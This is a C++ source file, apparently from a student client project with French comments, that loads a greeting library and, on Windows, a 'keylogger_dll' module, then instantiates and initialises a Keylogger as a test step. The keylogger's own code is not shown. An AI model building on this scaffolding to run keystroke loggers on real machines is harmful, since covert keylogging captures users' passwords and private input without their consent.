#include <iostream>
#include "client.h"
#include "sayHello.h"
#include "keylogger_dll/KeyloggerDLL.h"

/////////////////////////////////////////////////////////////////
//  SETTINGS
/////////////////////////////////////////////////////////////////

clientController::clientController(void) throw(DLibraryException)
{

	//////////////////////////////
	// Load libraries
	//////////////////////////////

	#ifdef __linux__
		this->libraries.add(1, "sayHello", "./libsayHello.so");
	#elif _WIN32
		this->libraries.add(1, "sayHello", "sayHello.dll");
		this->libraries.add(2, "keylogger_dll", "keylogger_dll.dll");
	#endif

	if (!(this->libraries.handler.loadByName("sayHello")))
		throw DLibraryException("sayHello", "Couldn't load module.");
	if (!(this->sayHello = this->libraries.handler.getDictionaryByName("sayHello")))
		throw DLibraryException("sayHello", "Couldn't get Dictionary.");

	//Test keylogger dll
	if (!(this->libraries.handler.loadByName("keylogger_dll")))
		throw DLibraryException("keylogger_dll", "Couldn't load module.");
	if (!(this->keylogger_dll = this->libraries.handler.getDictionaryByName("keylogger_dll")))
		throw DLibraryException("keylogger_dll", "Couldn't get Dictionary.");

}

clientController::~clientController(void)
{
	this->libraries.handler.closeList();
}

/////////////////////////////////////////////////////////////////
//  SCENARIO
/////////////////////////////////////////////////////////////////

int		clientController::mainAction(int ac, char **av) {

	// Dire bonjour
	this->sayHelloAction();
	
	// keylogger_test
	this->initKeyloggerAction();

	// Faire pleins de trucs ...
	// ...

	// Quitter
	return (0);
}

void					clientController::initKeyloggerAction(void)
{
	Keylogger* keylogger = ((_instantiate)(*this->keylogger_dll)["instantiate"])();
	std::cout << keylogger << std::endl;
	keylogger->init();
	//if (keylogger->init())
	//{
		//std::cout << "Init not ok" << std::endl;
//	}
	system("Pause");
	std::cout << "Init ok !" << std::endl;
}

void					clientController::sayHelloAction(void) {

	((_sayHelloFrom)(*this->sayHello)["sayHelloFrom"])("client");
}
